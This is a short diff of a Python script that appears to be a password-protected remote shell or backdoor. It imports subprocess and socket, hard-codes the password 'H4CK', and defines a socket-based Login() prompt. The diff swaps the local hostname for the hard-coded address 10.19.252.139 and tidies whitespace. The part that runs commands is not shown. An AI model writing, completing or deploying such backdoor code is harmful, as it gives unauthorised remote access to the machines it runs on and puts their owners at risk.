@@ -2,7 +2,7 @@
 import subprocess
 import socket
 
-host = socket.gethostname()
+host = "10.19.252.139"
 port = 12345
 passwd = "H4CK"
 
@@ -10,7 +10,7 @@ def Login():
     global s
     s.send("Login: ")
     pwd = s.recv(1024)
-    
+
     if pwd.strip() != passwd:
         Login()
     else:
